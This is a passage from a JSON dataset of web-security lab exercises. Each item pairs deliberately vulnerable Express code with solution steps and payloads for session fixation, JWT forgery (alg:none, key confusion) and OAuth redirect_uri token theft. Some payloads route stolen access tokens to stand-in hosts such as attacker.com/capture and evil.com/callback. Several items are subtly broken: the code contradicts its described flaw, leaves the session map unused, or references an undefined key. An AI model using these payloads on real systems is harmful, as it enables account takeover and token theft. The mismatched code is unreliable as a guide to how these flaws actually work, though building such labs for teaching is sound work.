    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'password123' }; app.get('/login', (req, res) => { const sid = req.cookies.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionId] = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send('Welcome to your account, ' + user); else res.status(403).send('Access denied'); }); app.listen(3000);",
    "payloads": [
      "sessionId=attacker-session-123",
      "POST /login with sessionId=attacker-session-123 and victim credentials",
      "Access /my-account with same fixed session cookie"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in token verification logic",
    "Lab Description": "This application relies on JWTs to authorize users, but does not enforce a strong algorithm during validation. The backend accepts JWTs with the 'alg' set to 'none', trusting the payload without verification. To solve: Forge a JWT with alg:none and impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in and intercept the Authorization: Bearer <JWT> header with Burp Suite.",
      "Copy the decoded header and payload of the token using jwt.io or Postman.",
      "Replace the alg value to none in the header and change the payload to {\"username\":\"carlos\"}.",
      "Remove the signature part of the token and resend the JWT via Burp Repeater.",
      "Access the /admin or /my-account endpoint using the forged token and confirm the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username) res.send('Welcome ' + decoded.payload.username); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer {header.payload.}",
      "GET /my-account with forged JWT"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect_uri validation logic",
    "Lab Description": "The OAuth flow in this application allows arbitrary redirect URIs due to improper validation, enabling token redirection to attacker-controlled domains. The app does not validate the redirect_uri against a strict whitelist. To solve: Steal an access token from the OAuth provider by injecting a rogue redirect URI and impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate the OAuth flow using Burp Suite or browser and note the authorization URL including redirect_uri.",
      "Replace redirect_uri with an attacker-controlled domain such as https://attacker.com/callback.",
      "Host a listener on your domain to capture the access token in the fragment/hash.",
      "Convince Carlos to click the OAuth URL with the manipulated redirect_uri (simulate manually).",
      "Extract the token and use it in a request to access Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; const token = 'access-token-for-carlos'; const uri = `${redirect_uri}#access_token=${token}`; res.redirect(uri); }); app.get('/my-account', (req, res) => { const token = req.query.token; if (token === 'access-token-for-carlos') res.send('Welcome to Carlos account'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
    "payloads": [
      "https://vulnerable.com/auth?client_id=xyz&redirect_uri=https://attacker.com/callback&response_type=token",
      "GET https://attacker.com/callback#access_token=access-token-for-carlos",
      "GET /my-account?token=access-token-for-carlos"
    ]
  },
  {
      "Lab scenario": "Session Fixation vulnerability in Login endpoint",
      "Lab Description": "This lab's session management is vulnerable to session fixation attacks. The application uses a predictable session ID mechanism. The attacker can set a session ID during login, forcing the user to use the attacker's session ID after login. To solve the lab, the attacker must hijack the session and access the victim's account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Launch Burp Suite and intercept a login request. Observe the session cookie sent in the response after a successful login.",
        "2. Log out of the application and try setting the session ID manually in the cookies header using Burp Suite's Intruder.",
        "3. In Burp Suite, craft a request where the session cookie is set to the attacker-controlled session ID and send the login request with the valid credentials.",
        "4. After successfully logging in, send a GET request to /account with the attacker-set session ID in the cookies. Verify that the attacker has hijacked the session and gained unauthorized access to the account.",
        "5. Verify by visiting the victim's account page and viewing the contents of the session (cookies or headers)."
      ],
      "Vulnerability name": "Session Management",
      "src code": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.post('/login', (req, res) => { const { username, password, sessionId } = req.body; if (username === 'victim' && password === 'password123') { res.cookie('sessionId', sessionId || 'default-session-id'); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const sessionId = req.cookies.sessionId; if (sessions[sessionId]) { res.send('Account page for victim'); } else { res.send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "sessionId=attacker-session-id",
        "sessionId=default-session-id"
      ]
    },
    {
      "Lab scenario": "JWT Token manipulation in User Authentication",
      "Lab Description": "This lab's authentication mechanism is vulnerable to JWT manipulation. The application does not properly validate the signature of the JWT token. To solve the lab, the attacker needs to modify the JWT payload and bypass the authentication to access a protected resource.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to intercept a request that includes a JWT token in the Authorization header.",
        "2. Decode the JWT token using an online tool or Burp's Repeater to reveal the header and payload.",
        "3. Modify the payload to include an elevated privilege (e.g., change 'role' from 'user' to 'admin').",
        "4. Re-encode the modified JWT token, ensuring to use the same algorithm (e.g., HS256).",
        "5. Replace the existing JWT token with the newly crafted token in the request header and send the request again.",
        "6. Verify that the server now grants admin access, as indicated by the elevated privileges in the response."
      ],
      "Vulnerability name": "JWT Manipulation",
      "src code": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secretKey = 'mysecret'; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'victim' && password === 'password123') { const token = jwt.sign({ username: 'victim', role: 'user' }, secretKey, { expiresIn: '1h' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (token) { jwt.verify(token, secretKey, (err, decoded) => { if (err) { res.status(401).send('Unauthorized'); } else if (decoded.role === 'admin') { res.send('Admin dashboard'); } else { res.status(403).send('Forbidden'); } }); } else { res.status(401).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log('JWT Manipulation Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZpY3RpbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA5NzMwMzc5LCJleHBpcmVzSW4iOjE2MDk3MzA1Nzd9.E0d9X_jVtxf_X8dAot68pWjI0In6ftchUt2lU8IX_Ng",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZpY3RpbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwOTczMDM3OX0.VvJwlIa0Nrf4Z2u9-Q7VUPwexnInlCVdcub7ebxeVwE"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration and Access Token Manipulation",
      "Lab Description": "The OAuth implementation in this lab has a misconfiguration where the access token is not properly validated. This allows the attacker to exchange a manipulated access token for unauthorized access to protected resources. To solve the lab, the attacker needs to tamper with the token and bypass OAuth authentication.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the request where the access token is being sent to the server for OAuth authorization.",
        "2. Observe the structure of the access token and its fields, including the 'client_id' and 'scope'.",
        "3. Modify the access token to change the 'client_id' and 'scope' fields to reflect a higher privilege level (e.g., change 'user' to 'admin').",
        "4. Re-send the modified token to the server to see if access is granted.",
        "5. If the server grants access, navigate to the protected resource and confirm that unauthorized access has been gained."
      ],
      "Vulnerability name": "OAuth Misconfiguration",
      "src code": "const express = require('express'); const app = express(); const OAuth2Server = require('oauth2-server'); const oauth = new OAuth2Server(); app.use(express.json()); app.post('/authorize', (req, res) => { const { token } = req.body; if (token === 'user-token') { res.send('Access granted to user resources'); } else if (token === 'admin-token') { res.send('Access granted to admin resources'); } else { res.status(401).send('Invalid token'); } }); app.post('/token', (req, res) => { const { client_id, client_secret } = req.body; if (client_id === 'client123' && client_secret === 'secret') { res.json({ access_token: 'user-token', token_type: 'bearer' }); } else { res.status(400).send('Invalid client credentials'); } }); const PORT = 3000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "access_token=user-token",
        "access_token=admin-token"
      ]
    },
  {
    "Lab scenario": "Session Fixation via Predictable Token in REST Login Flow",
    "Lab Description": "The application uses a predictable session ID generation mechanism and does not regenerate sessions upon successful authentication. This allows an attacker to fixate a victim's session. The application leaks session tokens in login responses, and session IDs remain valid across login attempts. To solve: Hijack Carlos's session by fixating a known session and accessing /account/carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /session/init using Burp Suite to retrieve a session ID",
      "Send crafted login request using POST /login with victim's credentials but without regenerating the session",
      "Reuse the same session ID in a browser and send it to the victim",
      "Login as Carlos from attacker side using the fixated session",
      "Access /account/carlos with the stolen session cookie"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const crypto = require('crypto'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); let sessions = {}; let users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/session/init', (req, res) => { const sessionId = 'sess_' + crypto.randomBytes(2).toString('hex'); sessions[sessionId] = null; res.cookie('sessionId', sessionId); res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.sessionId; const user = users.find(u => u.username === username && u.password === password); if (user && sessionId in sessions) { sessions[sessionId] = username; return res.send('Login successful'); } res.status(401).send('Login failed'); }); app.get('/account/:user', (req, res) => { const sessionId = req.cookies.sessionId; if (sessions[sessionId] === req.params.user) return res.send(`Welcome ${req.params.user}`); res.status(403).send('Forbidden'); }); app.listen(3000, () => console.log('Session Fixation Lab running on http://localhost:3000'));",
    "payloads": [
      "GET /session/init",
      "POST /login { \"username\": \"carlos\", \"password\": \"carlospass\" } with stolen session cookie",
      "GET /account/carlos with fixated session cookie"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in GraphQL Login",
    "Lab Description": "The application's JWT implementation accepts tokens signed with the 'none' algorithm, making it vulnerable to token forgery. JWTs are used for GraphQL session authentication. To solve: Forge an admin JWT using the 'none' algorithm and access the admin dashboard via a GraphQL query.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a login mutation via GraphQL using Postman and inspect returned JWT",
      "Decode the JWT header and observe the use of HS256 algorithm",
      "Forge a new JWT with header {\"alg\":\"none\"} and payload {\"username\":\"admin\",\"role\":\"admin\"}",
      "Send GraphQL query with Authorization: Bearer <forged_token>",
      "Query { adminPanel { logs } } to verify access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecretkey'; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); if (decoded.role === 'admin') return res.json({ data: { adminPanel: { logs: 'Sensitive logs' } } }); res.status(403).send('Unauthorized'); } catch (err) { res.status(401).send('Invalid token'); } }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username, role: 'admin' }, SECRET); return res.json({ token }); } res.status(401).send('Login failed'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
    "payloads": [
      "JWT with header: {\"alg\":\"none\"}, payload: {\"username\":\"admin\",\"role\":\"admin\"}",
      "GraphQL query: { adminPanel { logs } }",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Token Theft via Referer Leak",
    "Lab Description": "The application implements OAuth implicit flow and includes a misconfigured redirect URI that leaks the access token via the Referer header. An attacker can craft a malicious endpoint to capture the token. To solve: Leak Carlos's access token using an exploit page and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Host a malicious HTML page that performs a redirect to the vulnerable OAuth callback with access_token in URL",
      "Send the link to Carlos to initiate OAuth login and redirect",
      "Capture the Referer header containing access_token from Carlos’s request",
      "Use the stolen access_token in Postman to access /account/profile",
      "Verify access to Carlos’s account using the token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': { token: 'abc123token', profile: 'Carlos profile info' } }; app.get('/oauth/callback', (req, res) => { const token = req.query.access_token; if (!token) return res.status(400).send('Missing token'); res.redirect('https://attacker.com/log?referer=' + req.headers.referer); }); app.get('/account/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = Object.keys(users).find(u => users[u].token === token); if (user) return res.send(users[user].profile); res.status(403).send('Access denied'); }); app.listen(5000, () => console.log('OAuth Implicit Flow Lab running on http://localhost:5000'));",
    "payloads": [
      "<script>window.location='http://vuln-app.com/oauth/callback#access_token=abc123token';</script>",
      "Authorization: Bearer abc123token",
      "GET /account/profile"
    ]
  },
  {
    "Lab scenario": "Session fixation through insecure cookie management in login endpoint",
    "Lab Description": "This lab's session management logic allows an attacker to fix a session ID before login. The application accepts external session identifiers via URL and sets them before authentication. To solve: hijack Carlos's session after forcing them to authenticate with a known session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, intercept a GET /login?session=xyz123 request before authentication and observe the session cookie being set.",
      "2.Confirm that after login, the same session ID persists. This indicates fixation is possible.",
      "3.Trick the victim into logging in using a URL with a fixed session (e.g., /login?session=attacker-session-id).",
      "4.Login using the same session ID you forced Carlos to use.",
      "5.Access /my-account with that session to confirm session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty' }]; app.use((req, res, next) => { if (req.query.session) { res.cookie('sid', req.query.session); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) return res.send('Login success'); return res.status(401).send('Invalid'); }); app.get('/my-account', (req, res) => { const session = req.cookies.sid; if (session === 'attacker-session-id') return res.send('Account accessed: carlos'); res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "/login?session=attacker-session-id",
      "POST /login with credentials after session cookie fixed",
      "GET /my-account with sid=attacker-session-id"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in token verification header",
    "Lab Description": "This lab uses JWTs for authentication but verifies tokens based on the 'alg' header provided in the token itself, allowing an attacker to bypass signature checks. To solve: forge a valid token that grants access to Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Intercept an authenticated request using Burp Suite and extract the Authorization: Bearer JWT header.",
      "2.Decode the JWT using jwt.io or Burp Decoder and observe the header using 'RS256' algorithm.",
      "3.Modify the JWT header to 'alg':'none' and remove the signature.",
      "4.Change the payload sub field to 'carlos'.",
      "5.Send the forged JWT in Authorization header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const pubKey = 'PUBLIC_KEY_DUMMY'; const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ sub: username }, pubKey, { algorithm: 'RS256' }); res.json({ token }); } else res.status(401).json({ error: 'Invalid login' }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey, { algorithms: ['RS256', 'none'] }); if (decoded.sub === 'carlos') return res.send('Access granted to carlos'); } catch { return res.status(403).send('Unauthorized'); } res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "JWT header: {\"alg\":\"none\"}",
      "JWT payload: {\"sub\":\"carlos\"}",
      "Send token with Authorization: Bearer [unsigned token]"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allows token reuse via open redirect",
    "Lab Description": "This OAuth-based login flow has an open redirect on the callback endpoint, enabling token capture and reuse. The token is not scoped to specific redirect URIs. To solve: steal Carlos's access token and use it to access the /my-account endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Start Burp Suite and visit the OAuth login flow. Capture the redirect_uri parameter sent to the authorization server.",
      "2.Exploit the open redirect by setting redirect_uri to a controlled endpoint that leaks the token (e.g., https://attacker.com/capture#access_token=...).",
      "3.Send phishing link to Carlos to initiate OAuth login with malicious redirect_uri.",
      "4.Capture token from the attacker-controlled server logs or HTTP service.",
      "5.Reuse stolen token by sending Authorization: Bearer <token> to /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/callback', (req, res) => { const redirect = req.query.redirect_uri; const user = req.query.user; if (user === 'carlos') { const token = 'carlos-token'; return res.redirect(`${redirect}#access_token=${token}`); } res.status(403).send('Login failed'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('OAuth access granted to carlos'); res.status(403).send('Invalid token'); }); app.listen(4000);",
    "payloads": [
      "https://target.com/callback?redirect_uri=https://attacker.com/capture",
      "#access_token=carlos-token",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "JWT signature confusion vulnerability in REST API login endpoint",
    "Lab Description": "The application's JWT validation mechanism fails to properly verify the signing algorithm, allowing attackers to spoof tokens by injecting their own public key. The vulnerable backend accepts tokens with user-defined headers and improperly trusts attacker-supplied keys. To solve: Forge a valid JWT to impersonate Carlos and access /account-info.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a login response and observe the JWT returned in the Authorization header.",
      "2. Decode the JWT using jwt.io or Burp Decoder and observe the alg: RS256 field.",
      "3. Generate your own RSA keypair using openssl, and craft a malicious JWT with alg set to HS256 while using the public key as the HMAC secret.",
      "4. Sign the forged token using the HS256 algorithm and your RSA public key as the secret.",
      "5. Send a request to GET /account-info with Authorization: Bearer <forged token> and verify access to Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const PUBLIC_KEY = fs.readFileSync('public.pem'); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'securepass') { const token = jwt.sign({ user: 'carlos', role: 'user' }, PRIVATE_KEY, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account-info', (req, res) => { try { const token = req.headers.authorization.split(' ')[1]; const decoded = jwt.verify(token, PUBLIC_KEY); if (decoded.user === 'carlos') return res.send('Account info for Carlos'); } catch (e) { return res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('JWT Signature Confusion Lab running on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6InVzZXIifQ.<signed_with_public_key>",
      "JWT with alg: HS256, using attacker's public RSA key as the secret"
    ]
  },
  {
    "Lab scenario": "Session fixation in SOAP login handler",
    "Lab Description": "The SOAP-based login API does not invalidate existing session identifiers after successful login. This enables an attacker to fix a session ID before authentication. To solve: Fix a session for Carlos, log him in using the fixed ID, then reuse it to access /user-profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept a POST /soap/login request using Burp Suite. Note the Set-Cookie: sessionid value in the response.",
      "2. Manually send a crafted SOAP request with a predefined sessionid value in the Cookie header.",
      "3. Trick Carlos (or simulate in lab) to log in while using the fixed session ID by replaying the SOAP request with his credentials.",
      "4. Once Carlos logs in, reuse the same session ID to access /user-profile with Cookie: sessionid=<fixed_id>.",
      "5. Verify you have hijacked Carlos's session by viewing his profile info."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text({ type: '*/*' })); app.use(cookieParser()); const sessions = {}; app.post('/soap/login', (req, res) => { const xml = req.body; const username = xml.match(/<username>(.*?)<\\/username>/)[1]; const password = xml.match(/<password>(.*?)<\\/password>/)[1]; if (username === 'carlos' && password === 'letmein') { const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); sessions[sid] = username; res.setHeader('Set-Cookie', `sessionid=${sid}`); return res.send(`<response>Logged in</response>`); } res.status(401).send('<response>Unauthorized</response>'); }); app.get('/user-profile', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') return res.send('Profile: Carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation SOAP Lab running on http://localhost:4000'));",
    "payloads": [
      "POST /soap/login with Cookie: sessionid=fixed123 and body: <username>carlos</username><password>letmein</password>",
      "GET /user-profile with Cookie: sessionid=fixed123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in GraphQL mutation token issuance",
    "Lab Description": "The OAuth implementation uses the implicit grant flow without validating the redirect_uri. This allows an attacker to intercept access tokens by injecting a malicious redirection endpoint. To solve: Capture Carlos’s token via redirection abuse and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to inspect the GraphQL mutation for `generateOAuthToken(redirect_uri)`.",
      "2. Observe that no validation is enforced on the redirect_uri domain.",
      "3. Set redirect_uri to a public HTTP request bin or webhook.site and initiate the OAuth login.",
      "4. The access_token for Carlos will be leaked to your endpoint via the URL fragment.",
      "5. Extract the token and use it in Authorization: Bearer <token> to access /graphql with query { profile }."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const tokens = {}; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('generateOAuthToken')) { const redirectMatch = query.match(/redirect_uri:\\\"(.*?)\\\"/); const redirect = redirectMatch ? redirectMatch[1] : ''; const token = 'token-carlos-abc123'; tokens[token] = 'carlos'; return res.send({ data: { url: `${redirect}#access_token=${token}` } }); } if (query.includes('{ profile }')) { const auth = req.headers.authorization?.split(' ')[1]; if (tokens[auth] === 'carlos') return res.send({ data: { profile: 'Carlos Profile Data' } }); return res.status(403).send('Invalid token'); } res.status(400).send('Invalid request'); }); app.listen(4000, () => console.log('OAuth GraphQL Lab running on http://localhost:4000'));",
    "payloads": [
      "GraphQL mutation: generateOAuthToken(redirect_uri: \"https://webhook.site/abc\")",
      "Authorization: Bearer token-carlos-abc123 in POST /graphql with query { profile }"
    ]
  },
  {
    "Lab scenario": "GraphQL API session fixation vulnerability in login flow",
    "Lab Description": "The GraphQL API-based authentication system is vulnerable to session fixation due to insecure token re-use. The application does not invalidate old session tokens after login. To solve the lab, hijack Carlos’s session after login using a fixed session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Using Burp Suite, intercept a GraphQL login mutation with your own credentials and note the issued session cookie.",
      "2. Manipulate the session cookie (e.g., sessionId=ABC123) and resend the login request. Confirm that the same session cookie is still used after login.",
      "3. Send the fixed sessionId=ABC123 to the victim (Carlos) via a social engineering link.",
      "4. Wait for Carlos to log in, inheriting the fixed session ID you provided.",
      "5. Use sessionId=ABC123 to access /graphql with a query for Carlos’s account info. The lab is solved when Carlos’s account data is retrieved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = { 'carlos': { password: 'letmein', data: 'Sensitive info' }, 'wiener': { password: 'testpass', data: 'Test data' } }; app.post('/graphql', (req, res) => { const { query, variables } = req.body; const sessionId = req.cookies.sessionId || variables?.sessionId; if (query.includes('mutation Login')) { const { username, password } = variables; if (users[username] && users[username].password === password) { sessions[sessionId] = username; res.cookie('sessionId', sessionId); return res.json({ data: { login: 'Success' } }); } return res.json({ errors: ['Invalid login'] }); } else if (query.includes('query GetAccount')) { const username = sessions[sessionId]; if (username) return res.json({ data: { account: users[username].data } }); return res.status(403).json({ error: 'Unauthorized' }); } }); app.listen(4000, () => console.log('GraphQL Session Fixation Lab running on port 4000'));",
    "payloads": [
      "sessionId=ABC123",
      "mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) }",
      "query GetAccount { account }"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in admin verification logic",
    "Lab Description": "The application uses JWTs to control access to the admin panel. It mistakenly allows clients to specify the JWT algorithm, trusting unsigned tokens when 'alg' is set to 'none'. To solve the lab, forge an admin JWT to access /admin/dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. With OWASP ZAP or Burp Suite, intercept the JWT in a login request. Decode it and observe the algorithm and payload.",
      "2. Modify the JWT to set 'alg':'none' and manually change the payload to { \"username\": \"carlos\", \"role\": \"admin\" }.",
      "3. Remove the signature and rebase64-encode the header and payload segments only.",
      "4. Replace the Authorization header with the forged JWT.",
      "5. Send a GET request to /admin/dashboard. If successful, the lab is solved when admin panel data loads."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'insecure-secret'; app.use((req, res, next) => { const auth = req.headers['authorization']; if (auth && auth.startsWith('Bearer ')) { const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; } else { req.user = jwt.verify(token, secret); } } catch (e) { return res.status(401).send('Invalid token'); } } next(); }); app.get('/admin/dashboard', (req, res) => { if (req.user?.role === 'admin') return res.send('Admin dashboard loaded for ' + req.user.username); return res.status(403).send('Access denied'); }); app.listen(3001, () => console.log('JWT Algorithm Confusion Lab running on port 3001'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "JWT: <base64(header)>.<base64(payload)>."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party login provider redirect flow",
    "Lab Description": "This lab uses an OAuth2 provider to authenticate users. Due to lack of state parameter validation and open redirect behavior, the login flow is vulnerable to authorization code injection. To solve the lab, log in as Carlos by exploiting the redirect_uri parameter.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman or Burp Suite to initiate OAuth login and capture the /authorize request. Notice the 'redirect_uri' parameter is echoed by the server.",
      "2. Modify the 'redirect_uri' to a URL under your control. Observe that it gets used after authorization.",
      "3. Manually request an authorization code from the OAuth provider while logged in as Carlos.",
      "4. Inject the valid code for Carlos into the redirected callback with your manipulated 'redirect_uri'.",
      "5. The target app will accept and process the valid authorization code without verifying state. Once redirected to your account as Carlos, the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const tokenRes = await axios.post('https://oauth.fake/token', { code, redirect_uri }); const profile = await axios.get('https://oauth.fake/userinfo', { headers: { Authorization: 'Bearer ' + tokenRes.data.access_token } }); const user = profile.data.username; res.send('Welcome back, ' + user); } catch (err) { res.status(400).send('OAuth failed'); } }); app.listen(5000, () => console.log('OAuth Redirect Flow Lab running on port 5000'));",
    "payloads": [
      "GET /oauth/callback?code=<valid_code>&redirect_uri=https://evil.com/callback",
      "POST /token { code: <valid_code>, redirect_uri: https://evil.com/callback }",
      "OAuth URL: https://oauth.fake/authorize?client_id=xyz&redirect_uri=https://evil.com/callback"
    ]
  },
  {
    "Lab scenario": "GraphQL endpoint leaking JWT secret key",
    "Lab Description": "The application exposes a GraphQL API endpoint with introspection enabled and verbose error messages. A mutation leaks internal secrets including the JWT signing key through improper error handling. The application accepts tampered tokens signed with the leaked key. To solve: forge a valid admin JWT and access the admin dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to perform introspection queries on /graphql and identify all available mutations.",
      "2. Trigger the `generateToken(secret: String!)` mutation with malformed input. Observe verbose error disclosing the signing key.",
      "3. Craft a JWT token using jwt.io or a custom Node script, setting `alg` to HS256, and payload `{ \"role\": \"admin\" }`, signed with leaked key.",
      "4. Use Burp Suite to replace the Authorization header with `Bearer <forged-token>` on /admin.",
      "5. Observe successful access to the admin panel, verifying the exploit succeeded."
    ],
    "Vulnerability name": "Authentication",
